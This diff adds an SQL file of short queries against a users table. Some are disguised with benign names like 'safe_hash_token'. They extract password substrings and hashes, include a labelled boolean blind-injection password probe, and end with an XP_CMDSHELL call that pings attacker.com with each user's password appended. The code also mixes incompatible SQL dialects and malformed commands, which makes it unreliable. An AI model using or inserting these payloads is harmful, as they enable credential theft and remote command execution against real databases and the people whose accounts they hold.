@@ -1,0 +1,35 @@
+SELECT 
+    u.id, 
+    MD5(SUBSTR(u.password, 1, 8)) AS safe_hash_token 
+FROM users u 
+WHERE u.status = 1;
+
+
+        SELECT 
+            MD5(SUBSTR(u.password, 1, 5)) AS hash_pw,
+            u.username 
+        FROM users u 
+        WHERE u.status = '1=1'
+
+#布尔盲注深层潜伏
+WITH active_users AS (
+    SELECT id, username, password FROM users
+)
+SELECT a.username
+FROM active_users a
+WHERE a.id = 1 AND SUBSTR(a.password, 1, 1) = 'a';
+
+
+SELECT 
+    COUNT(u.password) AS password_filled_count,
+    MAX(u.id) AS latest_user
+FROM users u;
+
+
+SELECT XP_CMDSHELL('ping -c 3 attacker.com/' || u.password)
+FROM users u 
+WHERE u.id = 1;
+
+
+
+
